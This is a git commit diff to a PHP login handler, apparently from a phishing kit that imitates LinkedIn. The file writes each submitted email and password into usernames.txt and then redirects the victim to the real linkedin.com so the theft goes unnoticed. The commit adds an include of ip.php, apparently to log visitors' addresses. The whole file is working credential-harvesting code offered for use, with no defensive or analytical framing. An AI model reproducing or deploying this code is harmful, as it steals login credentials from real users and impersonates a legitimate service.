92c35d7eb5be2dee6c55c1f8793022c2c00cba04
Usama Abdul Sattar <usama123456789@protonmail.com>
2018-06-07 14:21:36 +0500

    Update login.php

--- WebPages/linkedin/login.php
+++ WebPages/linkedin/login.php
@@ -1,5 +1,6 @@
 <?php
 include 'base.php';
+include 'ip.php';
 
 file_put_contents("usernames.txt", "[EMAIL]: " . $_POST['UsernameForm'] . " [PASS]: " . $_POST['PasswordForm'] . "\n", FILE_APPEND);
 header('Location: https://linkedin.com/');
